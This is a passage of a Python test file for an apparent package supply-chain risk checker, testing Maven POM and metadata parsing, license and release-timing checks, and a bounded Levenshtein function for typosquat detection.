    assert license_name == "Apache-2.0"
    assert scm == "https://github.com/example/demo"
    assert deps == ["com.example:dep"]


def test_parse_maven_pom_ignores_bom_imports():
    pom = """<project xmlns="http://maven.apache.org/POM/4.0.0">
      <dependencyManagement><dependencies>
        <dependency><groupId>g</groupId><artifactId>bom</artifactId>
          <version>1.0</version><type>pom</type><scope>import</scope></dependency>
      </dependencies></dependencyManagement>
      <dependencies>
        <dependency><groupId>g</groupId><artifactId>real</artifactId></dependency>
      </dependencies>
    </project>"""
    assert _parse_pom(pom)[2] == ["g:real"]
    assert _bom_imports(pom) == [("g", "bom", "1.0")]


def test_maven_metadata_latest():
    xml = """<metadata><versioning>
      <latest>2.22.0</latest><release>2.22.0</release>
      <versions><version>2.1</version><version>2.22.0</version></versions>
    </versioning></metadata>"""
    assert _metadata_latest(xml) == "2.22.0"
    assert _metadata_latest(
        "<metadata><versioning><versions><version>1</version><version>2</version>"
        "</versions></versioning></metadata>"
    ) == "2"
    assert _metadata_latest("<metadata/>") is None


def test_license_noassertion_not_risk(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="github", name="pkg", license="NOASSERTION")
    )
    assert ev.applicable is False
    assert ev.value == 0.0


def test_release_anomaly_clustered_timestamps_not_applicable(conn):
    _add_package(conn)
    _add_versions(conn, [
        ("1.0.0", "2025-01-01T00:00:00+00:00", "a"),
        ("1.0.1", "2025-01-01T00:01:00+00:00", "a"),
        ("1.0.2", "2025-01-01T00:02:00+00:00", "a"),
        ("1.0.3", "2025-01-01T00:03:00+00:00", "a"),
        ("1.0.4", "2025-01-31T00:00:00+00:00", "a"),
    ])
    ev = release_anomaly.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False
    assert "clustered" in ev.evidence["reason"]


def test_bounded_levenshtein_preserves_transposition_and_caps():
    assert typosquat.levenshtein("reqeusts", "requests", 2) == 1
    assert typosquat.levenshtein("abcdef", "xyz", 2) == 3
    assert typosquat.levenshtein("bbcc", "ccab", 2) == 3
    assert typosquat.levenshtein("abcd", "wxyz", 1) == 2
